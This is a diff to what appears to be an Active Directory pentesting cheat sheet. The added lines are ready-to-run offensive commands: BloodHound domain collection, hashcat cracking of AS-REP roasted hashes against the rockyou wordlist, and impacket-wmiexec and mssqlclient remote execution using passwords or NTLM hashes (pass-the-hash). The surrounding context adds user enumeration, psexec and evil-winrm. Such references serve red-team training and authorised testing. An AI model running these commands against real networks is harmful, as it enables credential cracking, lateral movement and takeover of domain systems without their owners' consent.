@@ -324,6 +324,11 @@ Invoke-BloodHound -CollectionMethod All -Verbose
 Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
 ```
 
+-> BloodHound Python
+```bash
+bloodhound-python -u <user> -p <password> -ns <ip> -d <domain> -c All
+```
+
 ## Access Validation 
 -> Validation of network user credentials via smb using crackmmapexec  
 ```bash
@@ -358,6 +363,9 @@ kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 -> GetNPUsers.py - Query ASReproastable accounts from the KDC
 ```bash
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
+```
+```bash
+hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ## Kerberoast
@@ -398,6 +406,19 @@ impacket-psexec '<domain>/<user>'@<IP>
 -> Remote Access + evil-winrm  
 ```bash
 evil-winrm -i <IP> -u <user> -H <hash>
+```
+
+-> Remote Access + impacket-wmiexec
+```bash
+impacket-wmiexec <domain>/<user>:<password>@<ip>
+```
+```bash
+impacket-wmiexec -hashes <ntlm-hash> <user>@<ip>
+```
+
+-> Remote Access + impacket-mssqlclient 
+```bash
+impacket-mssqlclient <user>:<password>@<ip> -windows-auth
 ```
 
 ### Over Pass the Hash
